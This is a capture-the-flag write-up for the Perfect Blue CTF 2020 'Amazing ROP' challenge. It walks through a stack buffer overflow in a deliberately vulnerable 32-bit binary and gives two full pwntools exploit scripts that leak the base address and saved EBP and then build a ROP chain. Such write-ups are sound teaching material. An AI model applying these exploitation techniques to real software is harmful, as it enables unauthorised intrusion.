---
title: "Perfect Blue CTF 2020: Amazing ROP"
summary: "Should be a baby ROP challenge. Just need to follow directions and get first flag."
date: 2020-12-07
categories:
  - "writeups"
tags:
  - "exploitation"
---

**Category:** Binary Exploitation  
**Points:** 87  

## Challenge

> Should be a baby ROP challenge. Just need to follow directions and get first flag.  
> maze.chal.perfect.blue:1  
> [bof.bin](https://github.com/starfleetcadet75/writeups/blob/master/2020-pbctf/amazing-rop/bof.bin) [bof.c](https://github.com/starfleetcadet75/writeups/blob/master/2020-pbctf/amazing-rop/bof.c)

## Smash the Stack

We are provided with a 32-bit program without stack canaries but with position independant code and the stack set to non-executable.

```none
$ checksec ./bof.bin
[*] '/home/starfleetcadet75/Documents/pbctf/rop/bof.bin'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

The provided program crashes immediately after prompting the user to select the visualization mode.
By running the program with strace we discover that it is failing to open a file called "passwds".

```none
$ strace ./bof.bin 
execve("./bof.bin", ["./bof.bin"], 0x7ffd52282c20 /* 57 vars */) = 0
strace: [ Process PID=17412 runs in 32 bit mode. ]
brk(NULL)                               = 0x57acf000
...snip...
munmap(0xf7f9b000, 87140)               = 0
clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xf7fb21a8) = 17413
brk(NULL)                               = 0x57acf000
Do you want color in the visualization? (Y/n) brk(0x57af0000)                         = 0x57af0000
brk(0x57af1000)                         = 0x57af1000
openat(AT_FDCWD, "passwds", O_RDONLY)   = -1 ENOENT (No such file or directory)
stat64("mazes/1.lvl", 0xfff333fc)       = -1 ENOENT (No such file or directory)
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=NULL} ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```

Creating a "passwds" file with some random content allows us to run the program correctly.
It provides a nice visualization of the stack contents both before and after the user input is entered.

![userinput](https://raw.githubusercontent.com/starfleetcadet75/writeups/master/2020-pbctf/amazing-rop/userinput.png)

The program highlights the location of the secret in the stack and indicates that it is looking for a specific value.
The value should be the string "flag" according to the source code.

```c
// Check if secret has changed.
if (secret == 0x67616c66) {  // "flag"
    puts("You did it! Congratuations!");
    // print_flag(); // Print out the flag. You deserve it. (not anymore)
    printf("Returning to address: %p\n", (&secret)[4]);
    return;
}
else if (secret != 0xdeadbeef) {
    puts("Wow you overflowed the secret value! Now try controlling the value of it!");
}
else {
    puts("Maybe you haven't overflowed enough characters? Try again?");
}
```

It took 48 bytes to reach the location of the secret value so we can write out an initial exploit skeleton to trigger the correct code path.

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./bof.bin")
context.binary = exe

def conn():
    if args.LOCAL:
        return process(exe.path)
    else:
        return remote("maze.chal.perfect.blue", 1)

def main():
    r = conn()
    print(r.clean())
    r.sendline("n")

    # Write "flag" to the required location
    buf = b"A" * 48
    buf += p32(0x67616c66)

    r.sendline(buf)
    r.interactive()

if __name__ == "__main__":
    main()
```

The program prints a congratulations message and the return address but then exits.
To gain control of the instruction pointer we simply need to add 12 additional junk bytes after the secret value followed by our desired return address.

```none
[+] Starting local process '/home/starfleetcadet75/Documents/pbctf/rop/bof.bin': pid 17616
b'Do you want color in the visualization? (Y/n) '
[*] Switching to interactive mode
[*] Process '/home/starfleetcadet75/Documents/pbctf/rop/bof.bin' stopped with exit code 0 (pid 17616)

0xffb6ad6c | 00 00 00 00 00 00 00 00 |
0xffb6ad74 | 00 00 00 00 00 00 00 00 |
0xffb6ad7c | 00 00 00 00 00 00 00 00 |
0xffb6ad84 | 00 00 00 00 00 00 00 00 |
0xffb6ad8c | ff ff ff ff ff ff ff ff |
0xffb6ad94 | ff ff ff ff ff ff ff ff |
0xffb6ad9c | ef be ad de 5c 8f 59 56 |
0xffb6ada4 | 5c 8f 59 56 b8 ad b6 ff |
0xffb6adac | 99 55 59 56 d0 ad b6 ff |
0xffb6adb4 | 00 00 00 00 00 00 00 00 |
Input some text: 
0xffb6ad6c | 41 41 41 41 41 41 41 41 |
0xffb6ad74 | 41 41 41 41 41 41 41 41 |
0xffb6ad7c | 41 41 41 41 41 41 41 41 |
0xffb6ad84 | 41 41 41 41 41 41 41 41 |
0xffb6ad8c | 41 41 41 41 41 41 41 41 |
0xffb6ad94 | 41 41 41 41 41 41 41 41 |
0xffb6ad9c | 66 6c 61 67 00 8f 59 56 |
0xffb6ada4 | 5c 8f 59 56 b8 ad b6 ff |
0xffb6adac | 99 55 59 56 d0 ad b6 ff |
0xffb6adb4 | 00 00 00 00 00 00 00 00 |
You did it! Congratuations!
Returning to address: 0x56595599
[*] Got EOF while reading in interactive
```

## Building the ROP Chain

The comment at the top of the source code tells us that in order to get the flag we must put the correct values into the EAX, EDI, and ESI registers and then trigger a breakpoint instruction.

```c
// This is what you need to do to get the first flag
// void print_flag() {
//   asm volatile("mov $1, %%eax; mov $0x31337, %%edi; mov $0x1337, %%esi; int3" ::: "eax");
// }
```

Since ASLR is enabled, we need to use an information leak to determine what the program's base address is at runtime.
The stack visualization that gets printed prior to reading in user input is perfect since our script can parse it to determine the base address and then rebase all of the ROP gadget addresses.

As for the gadgets themselves, we can easily locate a gadget to move arbitrary values from our input into the EDI and ESI registers with `pop esi; pop edi; pop ebp; ret`.
The breakpoint instruction is simply the single byte 0xcc.

The tricky gadget to find and use is the `mov eax, 0x1`.
ROPgadget produces only one promising result: `mov eax, 1 ; jmp 0x1427`.

If we look back at the source code, we can see one obvious place in the `prompt` function where EAX will get set to the value 1.

```c
int prompt(char *prompt, int def) {
    char buff[32];

    printf("%s", prompt);
    fgets(buff, sizeof(buff), stdin);
    if (buff[0] == 'Y' || buff[0] == 'y')
        return 1;  // Set EAX = 1
    else if (buff[0] == 'N' || buff[0] == 'n')
        return 0;
    else
        return def;
}
```

The gadget we found is part of the instructions for this particular return statement.
If we look at the output from objdump we can see that the jump instruction is followed by a meaningless memory read, a `leave` instruction, and then it reaches a return.

![objdump](https://raw.githubusercontent.com/starfleetcadet75/writeups/master/2020-pbctf/amazing-rop/objdump.png)

This gadget will work, we just need to fiddle with our junk values to ensure that the `leave` instruction doesn't segfault.
The `leave` instruction is essentially the same as the sequence `mov esp, ebp; pop ebp`.
This means that it will set ESP to some value that we overwrote with junk in our shellcode.

To fix this problem, we once again use the stack visualization as a leak to save the original value of EBP before it gets trashed.
The saved EBP address is put in the ROP chain following the gadget so that the `leave` instruction can execute correctly.

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./bof.bin")
context.binary = exe

def conn():
    if args.LOCAL:
        return gdb.debug(exe.path)
    else:
        return remote("maze.chal.perfect.blue", 1)

pop3ret = 0x00000396  # pop esi; pop edi; pop ebp; ret
moveax = 0x00000401  # mov eax,0x1; jmp 1422; mov ebx,DWORD PTR [ebp-0x4]; leave; ret
int3 = 0x00000760  # cc

def main():
    r = conn()
    print(r.clean())
    r.sendline("n")

    # Get the base address from the leak
    leak = r.recvuntil(b"Input")
    line = leak.decode().split("\n")[-3]
    values = line.split("|")[1].split()
    retaddress = values[3] + values[2] + values[1] + values[0]
    retaddress = int(retaddress, 16)
    baseaddr = retaddress - 0x599
    print("Base address is: " + str(hex(baseaddr)))

    # Get the value for ebp from the leak
    line = leak.decode().split("\n")[-4]
    values = line.split("|")[1].split()
    ebpaddress = values[7] + values[6] + values[5] + values[4]
    ebpaddress = int(ebpaddress, 16)

    # Write "flag" to the required location
    buf = b"A" * 48
    buf += p32(0x67616c66)

    # Junk values to reach the return address that also happen to be valid addresses
    buf += p32(ebpaddress)
    buf += p32(ebpaddress)
    buf += p32(ebpaddress)

    # Build the ROP chain
    # mov eax, 1
    buf += p32(baseaddr + moveax)  # First return address
    # Junk values to fix the stupid leave instruction (also valid addresses)
    buf += p32(baseaddr + 43)
    buf += p32(baseaddr + 43)
    buf += p32(baseaddr + 43)

    # mov edi, 0x31337; mov esi, 0x1337
    buf += p32(baseaddr + pop3ret)
    buf += p32(0x1337)  # esi
    buf += p32(0x31337)  # edi
    buf += p32(0xdeadbeef)  # ebp

    # int3
    buf += p32(baseaddr + int3)

    r.sendline(buf)
    r.interactive()

if __name__ == "__main__":
    main()
```

![flag](https://raw.githubusercontent.com/starfleetcadet75/writeups/master/2020-pbctf/amazing-rop/flag.png)
